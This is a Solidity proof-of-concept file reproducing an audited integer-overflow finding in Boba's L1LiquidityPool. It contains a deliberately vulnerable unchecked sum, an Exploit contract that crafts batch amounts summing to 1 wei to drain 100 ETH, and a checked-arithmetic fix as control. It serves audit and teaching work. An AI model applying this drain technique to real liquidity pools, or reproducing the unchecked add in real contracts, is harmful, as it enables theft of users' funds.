// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Boba L1LiquidityPool.clientDepositL1Batch — the native-amount sum wraps on
    a pre-0.8 compiler (Quantstamp / Pavel Shabarkin, finding #60700).

    SYNTHETIC, cheatcode-free. Compiled with 0.8.27, so the vulnerable add is
    inside unchecked to reproduce the <0.8 wrap. msg.value is 1 wei and the
    amount list sums to 1 mod 2^256, with one leg equal to the 100 ETH already
    in the pool. Settlement pays that leg. Control uses a checked add and the
    deposit reverts, so the LP's 100 ETH stays. */

contract L1LiquidityPool {
    struct Credit {
        address to;
        uint256 amount;
    }

    Credit[] public credits;
    mapping(address => uint256) public lpDeposits;
    uint256 public acceptedValue;

    function deposit() external payable {
        lpDeposits[msg.sender] += msg.value;
    }

    function clientDepositL1Batch(uint256[] calldata amounts) external payable {
        uint256 ethAmount;
        for (uint256 i; i < amounts.length; i++) {
            unchecked {
                // @> VULN: pre-0.8 addition wraps, so a 1-wei call credits the pool
                ethAmount += amounts[i];
            }
        }
        acceptedValue = ethAmount;
        require(ethAmount == msg.value, "value");
        for (uint256 i; i < amounts.length; i++) {
            credits.push(Credit(msg.sender, amounts[i]));
        }
    }

    function clientPayL1Settlement() external {
        for (uint256 i; i < credits.length; i++) {
            uint256 amount = credits[i].amount;
            if (amount != 0 && address(this).balance >= amount) {
                address to = credits[i].to;
                credits[i].amount = 0;
                (bool ok,) = to.call{value: amount}("");
                require(ok, "pay");
            }
        }
    }

    receive() external payable {}
}

contract Exploit {
    uint256 public constant POOL = 100 ether;

    L1LiquidityPool public pool;
    uint256 public drained;

    constructor() {
        pool = new L1LiquidityPool();
    }

    function run() external payable {
        require(msg.value == 1, "seed");
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = POOL;
        amounts[1] = type(uint256).max - POOL + 2;
        pool.clientDepositL1Batch{value: 1}(amounts);
        require(pool.acceptedValue() == 1, "wrap");
        pool.clientPayL1Settlement();
        drained = address(this).balance;
        require(drained == POOL, "pool was not drained");
        require(address(pool).balance == 1, "dust left");
    }

    receive() external payable {}
}

/// @dev Control: the same sum uses checked arithmetic and reverts.
contract PoolFixed {
    mapping(address => uint256) public lpDeposits;

    function deposit() external payable {
        lpDeposits[msg.sender] += msg.value;
    }

    function clientDepositL1Batch(uint256[] calldata amounts) external payable {
        uint256 ethAmount;
        for (uint256 i; i < amounts.length; i++) {
            ethAmount += amounts[i];
        }
        require(ethAmount == msg.value, "value");
    }

    receive() external payable {}
}
